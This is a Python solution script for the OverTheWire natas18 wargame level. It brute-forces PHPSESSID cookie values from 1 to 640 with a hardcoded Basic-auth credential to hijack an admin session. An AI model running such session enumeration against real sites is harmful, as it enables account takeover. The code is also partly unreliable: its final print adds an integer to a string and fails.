import requests
from bs4 import BeautifulSoup

headers = {'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='}

url = 'http://natas18.natas.labs.overthewire.org/index.php'

for i in range(1, 641): # per source there are 640 session IDs
    r = requests.post(url, headers=headers, cookies={'PHPSESSID':'{}'.format(i)})
    if 'next' in r.text: # the word next only appears in the response when you've successfully logged in
        
        soup = BeautifulSoup(r.text, 'html.parser')
        print(soup.find(id='content'))
        print('PHPSESSID: '+i) # we need this for the next challenge

        break